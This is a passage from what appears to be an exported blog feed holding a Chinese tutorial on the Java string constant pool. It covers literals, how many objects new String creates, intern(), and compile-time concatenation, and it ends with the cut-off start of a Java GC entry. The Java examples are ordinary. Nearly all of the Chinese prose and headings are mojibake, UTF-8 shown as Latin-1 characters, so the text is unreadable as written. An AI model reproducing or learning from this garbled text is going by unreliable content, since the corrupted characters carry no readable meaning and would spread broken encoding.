class="code"><pre><span class="line">#<span class="number">16</span> = Utf8               s</span><br><span class="line">#<span class="number">21</span> = Utf8               Hollis</span><br><span class="line">#<span class="number">22</span> = Utf8               StringDemo</span><br></pre></td></tr></table></figure><p>ä¸Šé¢å‡ ä¸ªå¸¸é‡ä¸­ï¼Œs å°±æ˜¯å‰é¢æåˆ°çš„<strong>ç¬¦å·å¼•ç”¨</strong>ï¼Œè€Œ Hollis å°±æ˜¯å‰é¢æåˆ°çš„<strong>å­—é¢é‡</strong>ã€‚è€Œ Class æ–‡ä»¶ä¸­çš„å¸¸é‡æ± éƒ¨åˆ†çš„å†…å®¹ï¼Œä¼šåœ¨è¿è¡ŒæœŸè¢«è¿è¡Œæ—¶å¸¸é‡æ± åŠ è½½è¿›å»ã€‚å…³äºå­—é¢é‡ï¼Œè¯¦æƒ…å‚è€ƒ Java SE Specificationsã€‚</p><h4><span id="è¡¥å……">è¡¥å……:</span></h4><p><strong>å­—é¢é‡</strong>æ˜¯æŒ‡ç”±å­—æ¯ï¼Œæ•°å­—ç­‰æ„æˆçš„å­—ç¬¦ä¸²æˆ–è€…æ•°å€¼ï¼Œå®ƒåªèƒ½ä½œä¸ºå³å€¼å‡ºç°ï¼Œæ‰€è°“å³å€¼æ˜¯æŒ‡ç­‰å·å³è¾¹çš„å€¼ï¼Œå¦‚ï¼šint a&#x3D;123è¿™é‡Œçš„aä¸ºå·¦å€¼ï¼Œ123ä¸ºå³å€¼ã€‚</p><p><strong>å¸¸é‡</strong>å’Œ<strong>å˜é‡</strong>éƒ½å±äº<strong>å˜é‡</strong>ï¼Œåªä¸è¿‡å¸¸é‡æ˜¯èµ‹è¿‡å€¼åä¸èƒ½å†æ”¹å˜çš„å˜é‡ï¼Œè€Œæ™®é€šçš„å˜é‡å¯ä»¥å†è¿›è¡Œèµ‹å€¼æ“ä½œã€‚</p><p>ä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a;<span class="comment">//aå˜é‡</span></span><br><span class="line">const <span class="type">int</span> b=<span class="number">10</span>;<span class="comment">//bä¸ºå¸¸é‡,10ä¸ºå­—é¢é‡</span></span><br><span class="line">string str=<span class="string">&quot;hello world&quot;</span>;<span class="comment">//strä¸ºå˜é‡,hello worldä¸ºå­—é¢é‡</span></span><br></pre></td></tr></table></figure><h2><span id="new-stringåˆ›å»ºäº†å‡ ä¸ªå¯¹è±¡">new Stringåˆ›å»ºäº†å‡ ä¸ªå¯¹è±¡</span></h2><p>ä¸‹é¢ï¼Œæˆ‘ä»¬å¯ä»¥æ¥åˆ†æä¸‹ <code>String s = new String(&quot;Hollis&quot;);</code> åˆ›å»ºå¯¹è±¡æƒ…å†µäº†ã€‚</p><p>è¿™æ®µä»£ç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“çš„æ˜¯ï¼Œåœ¨ç¼–è¯‘æœŸï¼Œç¬¦å·å¼•ç”¨ s å’Œå­—é¢é‡ Hollis ä¼šè¢«åŠ å…¥åˆ° Class æ–‡ä»¶çš„å¸¸é‡æ± ä¸­ï¼Œç„¶ååœ¨ç±»åŠ è½½é˜¶æ®µï¼Œè¿™ä¸¤ä¸ªå¸¸é‡ä¼šè¿›å…¥å¸¸é‡æ± ã€‚</p><p>ä½†æ˜¯ï¼Œè¿™ä¸ªâ€œè¿›å…¥â€è¿‡ç¨‹ï¼Œå¹¶ä¸ä¼šç›´æ¥æŠŠæ‰€æœ‰ç±»ä¸­å®šä¹‰çš„å¸¸é‡å…¨éƒ¨éƒ½åŠ è½½è¿›æ¥ï¼Œè€Œæ˜¯ä¼šåšä¸ªæ¯”è¾ƒï¼Œå¦‚æœéœ€è¦åŠ åˆ°å­—ç¬¦ä¸²å¸¸é‡æ± ä¸­çš„å­—ç¬¦ä¸²å·²ç»å­˜åœ¨ï¼Œé‚£ä¹ˆå°±ä¸éœ€è¦å†æŠŠå­—ç¬¦ä¸²å­—é¢é‡åŠ è½½è¿›æ¥äº†ã€‚</p><p>æ‰€ä»¥ï¼Œå½“æˆ‘ä»¬è¯´&lt;è‹¥å¸¸é‡æ± ä¸­å·²ç»å­˜åœ¨ â€œhollisâ€ï¼Œåˆ™ç›´æ¥å¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯æ­¤æ—¶åªä¼šåˆ›å»ºä¸€ä¸ªå¯¹è±¡&gt;è¯´çš„å°±æ˜¯è¿™ä¸ªå­—ç¬¦ä¸²å­—é¢é‡åœ¨å­—ç¬¦ä¸²æ± ä¸­è¢«åˆ›å»ºçš„è¿‡ç¨‹ã€‚</p><p>è¯´å®Œäº†ç¼–è¯‘æœŸçš„äº‹å„¿äº†ï¼Œè¯¥åˆ°è¿è¡ŒæœŸäº†ï¼Œåœ¨è¿è¡ŒæœŸï¼Œnew String(â€œHollisâ€);æ‰§è¡Œåˆ°çš„æ—¶å€™ï¼Œæ˜¯è¦åœ¨ Java å †ä¸­åˆ›å»ºä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡çš„ï¼Œè€Œè¿™ä¸ªå¯¹è±¡æ‰€å¯¹åº”çš„å­—ç¬¦ä¸²å­—é¢é‡æ˜¯ä¿å­˜åœ¨å­—ç¬¦ä¸²å¸¸é‡æ± ä¸­çš„ã€‚ä½†æ˜¯ï¼ŒString s &#x3D; new String(â€œHollisâ€);ï¼Œå¯¹è±¡çš„ç¬¦å·å¼•ç”¨ s æ˜¯ä¿å­˜åœ¨Javaè™šæ‹Ÿæœºæ ˆä¸Šçš„ï¼Œä»–ä¿å­˜çš„æ˜¯å †ä¸­åˆšåˆšåˆ›å»ºå‡ºæ¥çš„çš„å­—ç¬¦ä¸²å¯¹è±¡çš„å¼•ç”¨ã€‚</p><p>æ‰€ä»¥ï¼Œä½ ä¹Ÿå°±çŸ¥é“ä»¥ä¸‹ä»£ç è¾“å‡ºç»“æœä¸º false çš„åŸå› äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Hollis&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Hollis&quot;</span>);</span><br><span class="line">System.out.println(s1 == s2);</span><br></pre></td></tr></table></figure><p>å› ä¸ºï¼Œ&#x3D;&#x3D; æ¯”è¾ƒçš„æ˜¯ s1 å’Œ s2 åœ¨å †ä¸­åˆ›å»ºçš„å¯¹è±¡çš„åœ°å€ï¼Œå½“ç„¶ä¸åŒäº†ã€‚ä½†æ˜¯å¦‚æœä½¿ç”¨ equalsï¼Œé‚£ä¹ˆæ¯”è¾ƒçš„å°±æ˜¯å­—é¢é‡çš„å†…å®¹äº†ï¼Œé‚£å°±ä¼šå¾—åˆ° trueã€‚</p><p><img src="/2020/03/29/JVM/image-20200329114023475.png" alt="image-20200329114023475"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä¸åŒç‰ˆæœ¬çš„JDKä¸­ï¼ŒJavaå †å’Œå­—ç¬¦ä¸²å¸¸é‡æ± ä¹‹é—´çš„å…³ç³»ä¹Ÿæ˜¯ä¸åŒçš„ï¼Œè¿™é‡Œä¸ºäº†æ–¹ä¾¿è¡¨è¿°ï¼Œå°±ç”»æˆä¸¤ä¸ªç‹¬ç«‹çš„ç‰©ç†åŒºåŸŸäº†ã€‚å…·ä½“æƒ…å†µè¯·å‚è€ƒJavaè™šæ‹Ÿæœºè§„èŒƒã€‚         1</span><br></pre></td></tr></table></figure><p>ä¸Šå›¾ä¸­ s1 å’Œ s2 æ˜¯ä¸¤ä¸ªå®Œå…¨ä¸åŒçš„å¯¹è±¡ï¼Œåœ¨å †ä¸­æœ‰è‡ªå·±çš„å†…å­˜ç©ºé—´ï¼Œå½“ç„¶ä¸ç›¸ç­‰äº†ã€‚</p><p>æ‰€ä»¥ï¼Œ<code>String s = new String(&quot;Hollis&quot;);</code>åˆ›å»ºå‡ ä¸ªå¯¹è±¡çš„ç­”æ¡ˆä½ ä¹Ÿå°±æ¸…æ¥šäº†ã€‚</p><p>å¸¸é‡æ± ä¸­çš„â€œå¯¹è±¡â€æ˜¯åœ¨ç¼–è¯‘æœŸå°±ç¡®å®šå¥½äº†çš„ï¼Œåœ¨ç±»è¢«åŠ è½½çš„æ—¶å€™åˆ›å»ºçš„ï¼Œå¦‚æœç±»åŠ è½½æ—¶ï¼Œè¯¥å­—ç¬¦ä¸²å¸¸é‡åœ¨å¸¸é‡æ± ä¸­å·²ç»æœ‰äº†ï¼Œé‚£è¿™ä¸€æ­¥å°±çœç•¥äº†ã€‚å †ä¸­çš„å¯¹è±¡æ˜¯åœ¨è¿è¡ŒæœŸæ‰ç¡®å®šçš„ï¼Œåœ¨ä»£ç æ‰§è¡Œåˆ° new çš„æ—¶å€™åˆ›å»ºçš„ã€‚</p><h2><span id="è¿è¡Œæ—¶å¸¸é‡æ± çš„åŠ¨æ€æ‰©å±•">è¿è¡Œæ—¶å¸¸é‡æ± çš„åŠ¨æ€æ‰©å±•</span></h2><p><strong>ç¼–è¯‘æœŸ</strong>ç”Ÿæˆçš„å„ç§å­—é¢é‡å’Œç¬¦å·å¼•ç”¨æ˜¯è¿è¡Œæ—¶å¸¸é‡æ± ä¸­æ¯”è¾ƒé‡è¦çš„ä¸€éƒ¨åˆ†æ¥æºï¼Œä½†æ˜¯å¹¶ä¸æ˜¯å…¨éƒ¨ã€‚é‚£ä¹ˆè¿˜æœ‰ä¸€ç§æƒ…å†µï¼Œå¯ä»¥åœ¨è¿è¡ŒæœŸåƒè¿è¡Œæ—¶å¸¸é‡æ± ä¸­å¢åŠ å¸¸é‡ã€‚é‚£å°±æ˜¯ String çš„internæ–¹æ³•ã€‚</p><p>å½“ä¸€ä¸ªStringå®ä¾‹è°ƒç”¨<code>intern()</code>æ–¹æ³•æ—¶ï¼ŒJVM ä¼šæŸ¥æ‰¾å¸¸é‡æ± ä¸­æ˜¯å¦æœ‰ç›¸åŒ Unicode çš„å­—ç¬¦ä¸²å¸¸é‡ï¼Œå¦‚æœæœ‰ï¼Œåˆ™è¿”å›å…¶çš„å¼•ç”¨ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™åœ¨å¸¸é‡æ± ä¸­å¢åŠ ä¸€ä¸ª Unicode ç­‰äº str çš„å­—ç¬¦ä¸²å¹¶è¿”å›å®ƒçš„å¼•ç”¨ï¼›</p><p><code>intern()</code>æœ‰ä¸¤ä¸ªä½œç”¨ï¼Œ<strong>ç¬¬ä¸€ä¸ªæ˜¯å°†å­—ç¬¦ä¸²å­—é¢é‡æ”¾å…¥å¸¸é‡æ± ï¼ˆå¦‚æœæ± æ²¡æœ‰çš„è¯ï¼‰ï¼Œç¬¬äºŒä¸ªæ˜¯è¿”å›è¿™ä¸ªå¸¸é‡çš„å¼•ç”¨ã€‚</strong></p><p>æˆ‘ä»¬å†æ¥çœ‹ä¸‹å¼€å¤´çš„é‚£ä¸ªè®©äººäº§ç”Ÿç–‘æƒ‘çš„ä¾‹å­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&quot;Hollis&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Hollis&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">s3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Hollis&quot;</span>).intern();</span><br><span class="line"> </span><br><span class="line">System.out.println(s1 == s2);</span><br><span class="line">System.out.println(s1 == s3);</span><br></pre></td></tr></table></figure><p>ä½ å¯ä»¥ç®€å•çš„ç†è§£ä¸º<code>String s1 = &quot;Hollis&quot;;</code>å’Œ<code>String s3 = new String(&quot;Hollis&quot;).intern();</code>åšçš„äº‹æƒ…æ˜¯ä¸€æ ·çš„ï¼ˆä½†å®é™…æœ‰äº›åŒºåˆ«ï¼Œè¿™é‡Œæš‚ä¸å±•å¼€ï¼‰ã€‚éƒ½æ˜¯å®šä¹‰ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡ï¼Œç„¶åå°†å…¶å­—ç¬¦ä¸²å­—é¢é‡ä¿å­˜åœ¨å¸¸é‡æ± ä¸­ï¼Œå¹¶æŠŠè¿™ä¸ªå­—é¢é‡çš„å¼•ç”¨è¿”å›ç»™å®šä¹‰å¥½çš„å¯¹è±¡å¼•ç”¨ã€‚å¦‚ä¸‹å›¾ï¼š</p><p>å¯¹äº<code>String s3 = new String(&quot;Hollis&quot;).intern();</code>ï¼Œåœ¨ä¸è°ƒinternæƒ…å†µï¼Œs3 æŒ‡å‘çš„æ˜¯ JVM åœ¨å †ä¸­åˆ›å»ºçš„é‚£ä¸ªå¯¹è±¡çš„å¼•ç”¨çš„ï¼ˆå¦‚å›¾ä¸­çš„s2ï¼‰ã€‚ä½†æ˜¯å½“æ‰§è¡Œäº† intern æ–¹æ³•æ—¶ï¼Œs3 å°†æŒ‡å‘å­—ç¬¦ä¸²å¸¸é‡æ± ä¸­çš„é‚£ä¸ªå­—ç¬¦ä¸²å¸¸é‡ã€‚</p><p>ç”±äº s1 å’Œ s3 éƒ½æ˜¯å­—ç¬¦ä¸²å¸¸é‡æ± ä¸­çš„å­—é¢é‡çš„å¼•ç”¨ï¼Œæ‰€ä»¥ s1&#x3D;&#x3D;s3ã€‚ä½†æ˜¯ï¼Œs2 çš„å¼•ç”¨æ˜¯å †ä¸­çš„å¯¹è±¡ï¼Œæ‰€ä»¥ s2!&#x3D;s1ã€‚</p><h2><span id="intern-çš„æ­£ç¡®ç”¨æ³•">intern çš„æ­£ç¡®ç”¨æ³•</span></h2><p>ä¸çŸ¥é“ï¼Œä½ æœ‰æ²¡æœ‰å‘ç°ï¼Œåœ¨<code>String s3 = new String(&quot;Hollis&quot;).intern();</code>ä¸­ï¼Œå…¶å® intern æ˜¯å¤šä½™çš„ï¼Ÿ</p><p>å› ä¸ºå°±ç®—ä¸ç”¨ internï¼ŒHollis ä½œä¸ºä¸€ä¸ªå­—é¢é‡ä¹Ÿä¼šè¢«åŠ è½½åˆ° Class æ–‡ä»¶çš„å¸¸é‡æ± ï¼Œè¿›è€ŒåŠ å…¥åˆ°è¿è¡Œæ—¶å¸¸é‡æ± ä¸­ï¼Œä¸ºå•¥è¿˜è¦å¤šæ­¤ä¸€ä¸¾å‘¢ï¼Ÿåˆ°åº•ä»€ä¹ˆåœºæ™¯ä¸‹æ‰ä¼šç”¨åˆ° intern å‘¢?<br> åœ¨è§£é‡Šè¿™ä¸ªä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ä¸‹ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&quot;Hollis&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="string">&quot;Chuang&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">s3</span> <span class="operator">=</span> s1 + s2;</span><br><span class="line"><span class="type">String</span> <span class="variable">s4</span> <span class="operator">=</span> <span class="string">&quot;Hollis&quot;</span> + <span class="string">&quot;Chuang&quot;</span>;</span><br></pre></td></tr></table></figure><p>åœ¨ç»è¿‡åç¼–è¯‘åï¼Œå¾—åˆ°ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&quot;Hollis&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="string">&quot;Chuang&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">s3</span> <span class="operator">=</span> (<span class="keyword">new</span> <span class="title class_">StringBuilder</span>()).append(s1).append(s2).toString();</span><br><span class="line"><span class="type">String</span> <span class="variable">s4</span> <span class="operator">=</span> <span class="string">&quot;HollisChuang&quot;</span>;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ï¼ŒåŒæ ·æ˜¯å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œs3 å’Œs4 åœ¨ç»è¿‡ç¼–è¯‘å™¨ç¼–è¯‘åçš„å®ç°æ–¹å¼å¹¶ä¸ä¸€æ ·ã€‚s3 è¢«è½¬åŒ–æˆ StringBuilder åŠ appendï¼Œè€Œ s4 è¢«ç›´æ¥æ‹¼æ¥æˆæ–°çš„å­—ç¬¦ä¸²ã€‚</p><p>å¦‚æœä½ æ„Ÿå…´è¶£ï¼Œä½ è¿˜èƒ½å‘ç°ï¼ŒString s4 &#x3D; s1 + s2; ç»è¿‡ç¼–è¯‘ä¹‹åï¼Œå¸¸é‡æ± ä¸­æ˜¯æœ‰ä¸¤ä¸ªå­—ç¬¦ä¸²å¸¸é‡çš„åˆ†åˆ«æ˜¯ Hollisã€Chuangï¼ˆå…¶å® Hollis å’Œ Chuang æ˜¯String s1 &#x3D; â€œHollisâ€;å’ŒString s2 &#x3D; â€œChuangâ€;å®šä¹‰å‡ºæ¥çš„ï¼‰ï¼Œ<strong>æ‹¼æ¥ç»“æœHollisChuang å¹¶ä¸åœ¨å¸¸é‡æ± ä¸­ã€‚</strong></p><p>å¦‚æœä»£ç åªæœ‰String s4 &#x3D; â€œHollisâ€ + â€œChuangâ€;ï¼Œé‚£ä¹ˆå¸¸é‡æ± ä¸­å°†åªæœ‰ HollisChuang è€Œæ²¡æœ‰ Hollis å’Œ Chuangã€‚</p><p>ç©¶å…¶åŸå› ï¼Œ<strong>æ˜¯å› ä¸ºå¸¸é‡æ± è¦ä¿å­˜çš„æ˜¯å·²ç¡®å®šçš„å­—é¢é‡å€¼ã€‚</strong>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹äºå­—ç¬¦ä¸²çš„æ‹¼æ¥ï¼Œçº¯å­—é¢é‡å’Œå­—é¢é‡çš„æ‹¼æ¥ï¼Œä¼šæŠŠæ‹¼æ¥ç»“æœä½œä¸ºå¸¸é‡ä¿å­˜åˆ°å­—ç¬¦ä¸²ã€‚</p><p>å¦‚æœåœ¨å­—ç¬¦ä¸²æ‹¼æ¥ä¸­ï¼Œæœ‰ä¸€ä¸ªå‚æ•°æ˜¯éå­—é¢é‡ï¼Œè€Œæ˜¯ä¸€ä¸ªå˜é‡çš„è¯ï¼Œæ•´ä¸ªæ‹¼æ¥æ“ä½œä¼šè¢«ç¼–è¯‘æˆStringBuilder.appendï¼Œè¿™ç§æƒ…å†µç¼–è¯‘å™¨æ˜¯æ— æ³•çŸ¥é“å…¶ç¡®å®šå€¼çš„ã€‚åªæœ‰åœ¨è¿è¡ŒæœŸæ‰èƒ½ç¡®å®šã€‚</p><p>é‚£ä¹ˆï¼Œæœ‰äº†è¿™ä¸ªç‰¹æ€§äº†ï¼Œintern å°±æœ‰ç”¨æ­¦ä¹‹åœ°äº†ã€‚é‚£å°±æ˜¯å¾ˆå¤šæ—¶å€™ï¼Œæˆ‘ä»¬åœ¨ç¨‹åºä¸­ç”¨åˆ°çš„<strong>å­—ç¬¦ä¸²æ˜¯åªæœ‰åœ¨è¿è¡ŒæœŸæ‰èƒ½ç¡®å®š</strong>çš„ï¼Œåœ¨ç¼–è¯‘æœŸæ˜¯æ— æ³•ç¡®å®šçš„ï¼Œé‚£ä¹ˆä¹Ÿå°±æ²¡åŠæ³•åœ¨ç¼–è¯‘æœŸè¢«åŠ å…¥åˆ°å¸¸é‡æ± ä¸­ã€‚</p><p>è¿™æ—¶å€™ï¼Œå¯¹äºé‚£ç§å¯èƒ½ç»å¸¸ä½¿ç”¨çš„å­—ç¬¦ä¸²ï¼Œä½¿ç”¨ intern è¿›è¡Œå®šä¹‰ï¼Œæ¯æ¬¡ JVM è¿è¡Œåˆ°è¿™æ®µä»£ç çš„æ—¶å€™ï¼Œå°±ä¼šç›´æ¥æŠŠå¸¸é‡æ± ä¸­è¯¥å­—é¢å€¼çš„å¼•ç”¨è¿”å›ï¼Œè¿™æ ·å°±å¯ä»¥å‡å°‘å¤§é‡å­—ç¬¦ä¸²å¯¹è±¡çš„åˆ›å»ºäº†ã€‚<br> å¦‚ä¸€ç¾å›¢ç‚¹è¯„å›¢é˜Ÿçš„ã€Šæ·±å…¥è§£æString#internã€‹æ–‡ä¸­ä¸¾çš„ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX</span> <span class="operator">=</span> <span class="number">1000</span> * <span class="number">10000</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> String[] arr = <span class="keyword">new</span> <span class="title class_">String</span>[MAX];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Integer[] DB_DATA = <span class="keyword">new</span> <span class="title class_">Integer</span>[<span class="number">10</span>];</span><br><span class="line">    <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>(<span class="number">10</span> * <span class="number">10000</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; DB_DATA.length; i++) &#123;</span><br><span class="line">        DB_DATA[i] = random.nextInt();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; MAX; i++) &#123;</span><br><span class="line">         arr[i] = <span class="keyword">new</span> <span class="title class_">String</span>(String.valueOf(DB_DATA[i % DB_DATA.length])).intern();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä»¥ä¸Šä»£ç ä¸­ï¼Œæˆ‘ä»¬æ˜ç¡®çš„çŸ¥é“ï¼Œä¼šæœ‰å¾ˆå¤šé‡å¤çš„ç›¸åŒçš„å­—ç¬¦ä¸²äº§ç”Ÿï¼Œä½†æ˜¯è¿™äº›å­—ç¬¦ä¸²çš„å€¼éƒ½æ˜¯åªæœ‰åœ¨è¿è¡ŒæœŸæ‰èƒ½ç¡®å®šçš„ã€‚æ‰€ä»¥ï¼Œåªèƒ½æˆ‘ä»¬é€šè¿‡internæ˜¾ç¤ºçš„å°†å…¶åŠ å…¥å¸¸é‡æ± ï¼Œ<strong>è¿™æ ·å¯ä»¥å‡å°‘å¾ˆå¤šå­—ç¬¦ä¸²çš„é‡å¤åˆ›å»ºã€‚</strong></p><h2><span id="æ€»ç»“">æ€»ç»“</span></h2><p>æˆ‘ä»¬å†å›åˆ°æ–‡ç« å¼€å¤´é‚£ä¸ªç–‘æƒ‘ï¼šæŒ‰ç…§ä¸Šé¢çš„ä¸¤ä¸ªé¢è¯•é¢˜çš„å›ç­”ï¼Œå°±æ˜¯è¯´new Stringä¹Ÿä¼šæ£€æŸ¥å¸¸é‡æ± ï¼Œå¦‚æœæœ‰çš„è¯å°±ç›´æ¥å¼•ç”¨ï¼Œå¦‚æœä¸å­˜åœ¨å°±è¦åœ¨å¸¸é‡æ± åˆ›å»ºä¸€ä¸ªï¼Œé‚£ä¹ˆè¿˜è¦internå¹²å•¥ï¼Ÿéš¾é“ä»¥ä¸‹ä»£ç æ˜¯æ²¡æœ‰æ„ä¹‰çš„å—ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Hollis&quot;</span>).intern();        </span><br></pre></td></tr></table></figure><p>new String æ‰€è°“çš„â€œå¦‚æœæœ‰çš„è¯å°±ç›´æ¥å¼•ç”¨â€ï¼ŒæŒ‡çš„æ˜¯Javaå †ä¸­åˆ›å»ºçš„Stringå¯¹è±¡ä¸­åŒ…å«çš„å­—ç¬¦ä¸²å­—é¢é‡ç›´æ¥å¼•ç”¨å­—ç¬¦ä¸²æ± ä¸­çš„å­—é¢é‡å¯¹è±¡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿˜æ˜¯è¦åœ¨å †é‡Œé¢åˆ›å»ºå¯¹è±¡çš„ã€‚</p><p>è€Œ<code>intern``ä¸­è¯´çš„``â€œ``å¦‚æœæœ‰çš„è¯å°±ç›´æ¥è¿”å›å…¶å¼•ç”¨``â€``ï¼ŒæŒ‡çš„æ˜¯ä¼šæŠŠå­—é¢é‡å¯¹è±¡çš„å¼•ç”¨ç›´æ¥è¿”å›ç»™å®šä¹‰çš„å¯¹è±¡ã€‚è¿™ä¸ªè¿‡ç¨‹æ˜¯ä¸ä¼šåœ¨`` Java ``å †ä¸­å†åˆ›å»ºä¸€ä¸ª`` String ``å¯¹è±¡çš„ã€‚</code></p><p>çš„ç¡®ï¼Œä»¥ä¸Šä»£ç çš„å†™æ³•å…¶å®æ˜¯ä½¿ç”¨ intern æ˜¯æ²¡ä»€ä¹ˆæ„ä¹‰çš„ã€‚å› ä¸ºå­—é¢é‡ Hollis ä¼šä½œä¸ºç¼–è¯‘æœŸå¸¸é‡è¢«åŠ è½½åˆ°è¿è¡Œæ—¶å¸¸é‡æ± ã€‚</p><p>ä¹‹æ‰€ä»¥èƒ½æœ‰ä»¥ä¸Šçš„ç–‘æƒ‘ï¼Œå…¶å®æ˜¯å¯¹å­—ç¬¦ä¸²å¸¸é‡æ± ã€å­—é¢é‡ç­‰æ¦‚å¿µæ²¡æœ‰çœŸæ­£ç†è§£å¯¼è‡´çš„ã€‚æœ‰äº›é—®é¢˜å…¶å®å°±æ˜¯è¿™æ ·ï¼Œå•ä¸ªé—®é¢˜ï¼Œè‡ªå·±éƒ½çŸ¥é“ç­”æ¡ˆï¼Œä½†æ˜¯å¤šä¸ªé—®é¢˜ç»¼åˆåˆ°ä¸€èµ·å°±è’™äº†ã€‚å½’æ ¹ç»“åº•æ˜¯çŸ¥è¯†çš„ç†è§£è¿˜åœç•™åœ¨ç‚¹ä¸Šï¼Œæ²¡æœ‰ä¸²æˆé¢ã€‚</p><p><a href="https://blog.csdn.net/ShelleyLittlehero/article/details/81196418">https://blog.csdn.net/ShelleyLittlehero/article/details/81196418</a></p>]]></content>
      
      
      <categories>
          
          <category> é¢è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javaè™šæ‹Ÿæœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java GC</title>
      <link href="/2020/03/28/Java-GC/"/>
      <url>/2020/03/28/Java-GC/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ç›˜ç‚¹äº†å¸¸è€ƒçš„Java GC</p><span id="more"></span><!-- toc --><ul><li><a href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E8%A7%A3%E5%86%B3%E4%BA%86">è‡ªåŠ¨åŒ–è§£å†³äº†ï¼šâˆš</a></li><li><a href="#%E5%AF%B9%E8%B1%A1%E8%A2%AB%E5%88%A4%E5%AE%9A%E4%B8%BA%E5%9E%83%E5%9C%BE%E7%9A%84%E6%A0%87%E5%87%86">å¯¹è±¡è¢«åˆ¤å®šä¸ºåƒåœ¾çš„æ ‡å‡†ï¼š âˆš</a></li><li><a href="#%E5%88%A4%E5%AE%9A%E6%96%B9%E6%B3%95">åˆ¤å®šæ–¹æ³•</a><ul><li><a href="#%E5%BC%95%E7%94%A8%E8%AE%A1%E6%95%B0%E6%B3%95">å¼•ç”¨è®¡æ•°æ³• âˆš</a></li><li><a href="#%E5%8F%AF%E8%BE%BE%E6%80%A7%E5%88%86%E6%9E%90%E7%AE%97%E6%B3%95%E4%B8%BB%E6%B5%81">å¯è¾¾æ€§åˆ†æç®—æ³•ï¼ˆä¸»æµï¼‰âˆš</a><ul><li><a href="#%E5%8F%AF%E4%BB%A5%E4%BD%9C%E4%B8%BAgc-root%E7%9A%84%E5%AF%B9%E8%B1%A1-">å¯ä»¥ä½œä¸ºGC Rootçš„å¯¹è±¡ -</a></li></ul></li></ul></li><li><a 